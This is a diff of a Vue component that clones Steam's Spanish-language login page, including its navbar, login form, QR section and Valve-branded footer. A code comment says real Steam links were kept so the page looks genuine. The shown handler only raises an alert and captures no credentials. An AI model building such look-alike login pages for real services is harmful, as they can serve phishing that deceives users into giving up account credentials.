@@ -7,32 +7,71 @@ const remember = ref(false);
 
 const handleSubmit = () => {
   if (!email.value || password.value.length < 6) {
-    return alert("Todos los campos son obligatorios y la contraseña debe tener al menos 6 caracteres.");
+    return alert(
+      "Todos los campos son obligatorios y la contraseña debe tener al menos 6 caracteres."
+    );
   }
   alert("¡Inicio de sesión exitoso!");
 };
 </script>
 
-<-- Aquello que no tiene el a=# es qp no le he puesto q lo redireccione a la pagina original de steam, dando a entender como si fuera la de adeveras xd-->
+<-- Aquello que no tiene el a=# es qp no le he puesto q lo redireccione a la
+pagina original de steam, dando a entender como si fuera la de adeveras xd-->
 <template>
   <div class="navbar">
     <div class="navbar-content">
       <div class="logo">
         <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
-          <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44">
+          <img
+            src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016"
+            width="176"
+            height="44"
+          />
         </a>
       </div>
       <div class="navbar-links">
-        <a href="https://store.steampowered.com/?snr=1_60_4__global-header" class="selected-link">TIENDA</a>
-        <a href="https://steamcommunity.com/">COMUNIDAD</a>
-        <a href="https://store.steampowered.com/about/?snr=1_60_4__global-header">ACERCA DE</a>
+        <!-- Dropdown Tienda -->
+        <div class="dropdown">
+          <button class="dropbtn">TIENDA</button>
+          <div class="dropdown-content">
+            <a href="#">Inicio</a>
+            <a href="#">Lista de descubrimientos</a>
+            <a href="#">Lista de deseados</a>
+            <a href="#">Tienda de puntos</a>
+            <a href="#">Noticias</a>
+            <a href="#">Estadísticas</a>
+          </div>
+        </div>
+
+        <!-- Dropdown Comunidad -->
+        <div class="dropdown">
+          <button class="dropbtn">COMUNIDAD</button>
+          <div class="dropdown-content">
+            <a href="#">Inicio</a>
+            <a href="#">Discusiones</a>
+            <a href="#">Workshop</a>
+            <a href="#">Mercado</a>
+            <a href="#">Retransmisión</a>
+          </div>
+        </div>
+
+        <!-- Enlace de Acerca de -->
+        <a
+          href="https://store.steampowered.com/about/?snr=1_60_4__global-header"
+          >ACERCA DE</a
+        >
+        <!-- Enlace de Soporte -->
         <a href="https://help.steampowered.com/es/">SOPORTE</a>
       </div>
       <div class="navbar-action-download">
-        <a href="https://store.steampowered.com/about/?snr=1_60_4__global-header" class="install-link">Instalar Steam</a>
+        <a
+          href="https://store.steampowered.com/about/?snr=1_60_4__global-header"
+          class="install-link"
+          >Instalar Steam</a
+        >
       </div>
       <div class="navbar-action-login">
-        <a href="#" class="login-link">iniciar sesión</a>
+        <a href="#" class="login-link">Iniciar sesión</a>
       </div>
     </div>
   </div>
@@ -65,11 +104,13 @@ const handleSubmit = () => {
               />
             </div>
             <div class="remember-me">
-              <input type="checkbox" id="remember" v-model="remember">
+              <input type="checkbox" id="remember" v-model="remember" />
               <label for="remember">Recordarme</label>
             </div>
             <div class="form-group">
-              <button type="submit" class="submit-button">Iniciar sesión</button>
+              <button type="submit" class="submit-button">
+                Iniciar sesión
+              </button>
             </div>
           </form>
           <div class="help-link">
@@ -79,39 +120,327 @@ const handleSubmit = () => {
       </div>
       <div class="login-right">
         <div class="qr-section">
-          <p>O BIEN CON UN CÓDIGO QR</p>
-          <div class="qr-code">
-            <div class="qr-image">
-              <div class="qr-placeholder"></div>
-              <div class="qr-icon">G</div>
-            </div>
-          </div>
-          <p class="qr-info">Usa la <a href="https://store.steampowered.com/mobile">aplicación Steam Mobile</a> para iniciar sesión con un código QR</p>
-        </div>
+  <p>O BIEN CON UN CÓDIGO QR</p>
+  <div class="qr-code">
+    <div class="qr-image">
+      <!-- Aquí va la imagen del código QR -->
+      <img src="./assets/qr.png" alt="Código QR de Steam" class="qr-placeholder">
+      <div class="qr-icon"></div>
+    </div>
+  </div>
+  <p class="qr-info">
+    Usa la
+    <a href="https://store.steampowered.com/mobile">aplicación Steam Mobile</a>
+    para iniciar sesión con un código QR
+  </p>
+</div>
       </div>
     </div>
   </div>
 
-  <div class="footer">
-    <div class="new-account-section">
-      <div class="new-account-container">
-        <div class="new-account-text">
-          <h2>¿Tu primera vez en Steam?</h2>
-          <div class="create-account-button">
-            <a href="#">Crea una cuenta</a>
-          </div>
+  <footer class="footer">
+    <div class="footer-new-user">
+  <div class="left-align-container">
+    <a class="new-user-text">¿Es la primera vez que usas Steam?</a>
+    <button type="submit" class="create-button">Crea una cuenta</button>
+  </div>
+  <p class="footer-text">
+    Es gratis y muy fácil. Descubre miles de juegos para jugar con
+    millones de nuevos amigos. Más información acerca de Steam
+  </p>
+</div>
+
+    <div class="footer-content">
+      <!-- Info -->
+      <div class="footer-legal">
+        <div class="image-container">
+          <img
+            src="./assets/footerLogo_valve_new.png"
+            alt="Imagen izquierda"
+            class="footer-image-left"
+          />
+          <img
+            src="./assets/logo_steam_footer.png"
+            alt="Imagen derecha"
+            class="footer-image-right"
+          />
         </div>
-        <div class="new-account-info">
-          <p>Es gratis y muy fácil. Descubre miles de juegos para jugar con millones de amigos nuevos. <a href="#">Más información acerca de Steam</a></p>
-        </div>
+        <p>
+          © 2025 Valve Corporation. Todos los derechos reservados. Todas las
+          marcas registradas pertenecen a sus respectivos dueños en EE. UU. y
+          otros países.
+        </p>
+        <p>
+          Todos los precios incluyen IVA (donde sea aplicable).  
+          <a
+            href="https://store.steampowered.com/privacy_agreement/"
+            target="_blank"
+            >Política de Privacidad</a
+          >
+            |  
+          <a href="https://www.valvesoftware.com/es/legal" target="_blank"
+            >Información legal</a
+          >
+            |  
+          <a
+            href="https://store.steampowered.com/subscriber_agreement/"
+            target="_blank"
+            >Acuerdo de Suscriptor a Steam</a
+          >
+            |  
+          <a
+            href="https://store.steampowered.com/account/cookiepreferences/?snr=1_44_44_"
+            target="_blank"
+            >Cookies</a
+          >
+        </p>
+      </div>
+
+      <!-- enlaces -->
+      <div class="footer-links">
+        <a href="https://www.valvesoftware.com/es/about" target="_blank"
+          >Acerca de Valve</a
+        >
+          |  
+        <a href="https://www.valvesoftware.com/es/jobs" target="_blank"
+          >Empleo</a
+        >
+          |  
+        <a href="https://partner.steamgames.com/" target="_blank">Steamworks</a>
+          |  
+        <a href="https://store.steampowered.com/about/" target="_blank"
+          >Distribución de Steam</a
+        >
+          |  
+        <a
+          href="https://help.steampowered.com/es-419/?snr=1_44_44_"
+          target="_blank"
+          >Soporte</a
+        >
+          |  
+        <a
+          href="https://store.steampowered.com/digitalgiftcards/"
+          target="_blank"
+          >Tarjetas regalo</a
+        >
+          |  
+        <a
+          href="https://www.facebook.com/Steam"
+          target="_blank"
+          aria-label="Facebook"
+        >
+          <img src="./assets/ico_facebook.png" alt="Facebook" />
+        </a>
+        <a
+          href="https://twitter.com/Steam"
+          target="_blank"
+          aria-label="Twitter"
+        >
+            |  
+          <img src="./assets/ico_twitter.png" alt="Twitter" />
+        </a>
+        <a href="https://www.bsky.com/Steam" target="_blank" aria-label="bsky">
+            |  
+          <img src="./assets/ico_bsky.png" alt="bsky" />
+        </a>
       </div>
     </div>
-  </div>
+  </footer>
 </template>
 
 <style scoped>
-body {
-  
+.dropbtn {
+  background-color: #171a21;
+  color: #b6b7b4;
+  font-size: 14px;
+  text-transform: uppercase;
+  font-weight: 500;
+  border: none;
+  cursor: pointer;
+  padding: 8px 0;
+  text-align: center;
+}
+
+.dropbtn:hover {
+  color: #dcdedf;
+}
+
+.dropdown {
+  position: relative;
+  display: inline-block;
+}
+
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: #3d4450;
+  min-width: 160px;
+  z-index: 1;
+  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+  border-radius: 4px;
+  color: #ffffff;
+}
+
+.dropdown-content a {
+  font-size: x-small;
+  color: #ffffff;
+  padding: 12px 20px;
+  text-decoration: none;
+  display: block;
+}
+
+.dropdown-content a:hover {
+  background-color: #dcdedf;
+  color: #dcdedf;
+}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+.footer-legal {
+  position: relative;
+  padding: 25px;
+}
+
+.image-container {
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  display: flex;
+  justify-content: space-between;
+}
+
+.footer-image-left,
+.footer-image-right {
+  width: auto;
+  height: 25px;
+}
+
+.footer-new-user {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.left-align-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center; 
+  width: 150%; 
+  text-align: center; 
+}
+
+.new-user-text {
+  color: #ffffff;
+  font-size: 20px;
+  width: 80%;
+  margin-bottom: 10px;
+  font-weight: bold;
+}
+
+.create-button {
+  padding: 10px 20px;
+  background-color: #1999ff;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 14px;
+  margin-top: 10px; 
+}
+
+.create-button:hover {
+  background-color: #3ba8ff;
+}
+
+.footer-text {
+  color: #b8b6b4;
+  font-size: 12px;
+  margin: 0;
+  text-align: center;
+  width: 100%;
+}
+
+.footer-divider {
+  width: 100%;
+  height: 1px;
+  background-color: rgba(255, 255, 255, 0.2);
+}
+
+.footer {
+  background-color: #171a21;
+  padding: 20px 0;
+  color: #acb2b8;
+  font-size: 12px;
+  text-align: center;
+}
+
+.footer-content {
+  max-width: 940px;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 10px;
+  border-top: 1px solid rgba(255, 255, 255, 0.2);
+  margin-top: 10px;
+}
+
+.footer-social {
+  margin-bottom: 20px;
+}
+
+.footer-social a {
+  margin: 0 10px;
+}
+
+.footer-social img {
+  width: 24px;
+  height: 24px;
+}
+
+.footer-links {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 20px;
+  padding-top: 10px;
+  border-top: 1px solid rgba(255, 255, 255, 0.2);
+  margin-top: -20px;
+}
+
+.footer-links a {
+  color: #acb2b8;
+  text-decoration: none;
+  font-size: 12px;
+  display: flex;
+  align-items: center;
+}
+
+.footer-links img {
+  width: 16px;
+  height: 16px;
+  margin-left: 5px;
+}
+
+.footer-legal p {
+  margin: 5px 0;
+}
+
+.footer-legal a {
+  color: #acb2b8;
+  text-decoration: none;
+}
+
+.footer-legal a:hover {
+  color: #ffffff;
+}
+
+.body {
   color: #acb2b8;
   font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
   margin: 0;
@@ -158,7 +487,7 @@ body {
 }
 
 .selected-link::after {
-  content: '';
+  content: "";
   position: absolute;
   bottom: 0;
   left: 0;
@@ -182,12 +511,15 @@ body {
   color: white;
 }
 
-.install-link, .login-link {
+.install-link,
+.login-link {
   color: #b8b6b4;
   text-decoration: none;
 }
 
-.install-link:hover, .login-link:hover, .navbar-links a:hover {
+.install-link:hover,
+.login-link:hover,
+.navbar-links a:hover {
   color: #ffffff;
 }
 
